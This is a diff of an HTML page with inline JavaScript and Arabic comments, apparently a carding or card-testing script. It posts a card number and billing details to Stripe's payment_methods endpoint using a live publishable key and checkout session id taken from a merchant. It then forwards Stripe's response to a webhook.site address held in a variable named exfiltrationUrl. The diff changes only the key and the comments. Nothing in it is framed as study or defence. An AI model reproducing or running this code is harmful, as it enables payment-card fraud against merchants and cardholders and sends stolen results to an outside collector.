@@ -9,7 +9,7 @@
     <script>
         const targetUrl = "https://api.stripe.com/v1/payment_methods";
 
-        // تجميع الـ Body بالكامل بالشكل الصحيح
+        // تجميع الـ Body بالكامل مع المفتاح الجديد الصحيح
         const postData = new URLSearchParams({
             "type": "card",
             "card[number]": "4539382852159718",
@@ -21,7 +21,7 @@
             "billing_details[address][line1]": "253 Mayer Courts",
             "billing_details[address][city]": "hamed",
             "billing_details[address][postal_code]": "86252-6922",
-            "key": "pk_live_51MPWO0AWilt2EAVVfWfPTQhgmLA0EeacLSzAs6e3vECCcMBvwcMse81XgX06klbdBHbPBdp0mrXE8P1gBrxE7yhH00RPHQ8SyG",
+            "key": "pk_live_51MPW00AWilt2EAVVFWfPTQhgmLA0EeacLSzAs6e3vECCcMBvwcMse81XgXO6k1bdBHbPBdpOmrXE8P1gBrxE7yhH00RPHQ8SyG",
             "payment_user_agent": "stripe.js/572ee5cc22; 3B+stripe-js-v3;2F572ee5cc22;3B+checkout",
             "client_attribution_metadata[client_session_id]": "34bf4c1a-793d-440d-b0a6-ea4046a31af9",
             "client_attribution_metadata[checkout_session_id]": "cs_live_b1G2romlUWHesKK0nru1MfhNa6jWlnbUtkayMILqTCUHYOstepFoawhra",
@@ -41,7 +41,7 @@
         })
         .then(response => response.json())
         .then(data => {
-            // استبدل الـ URL ده برابط الـ Webhook الخاص بك لتلقي الداتا عليه
+            // رابط الـ Webhook الخاص بك لاستقبال الاستجابة المسحوبة
             const exfiltrationUrl = "https://webhook.site/d80e6a3b-5db7-401f-a4a9-04facede08b0?data=" + encodeURIComponent(JSON.stringify(data));
             
             fetch(exfiltrationUrl, {
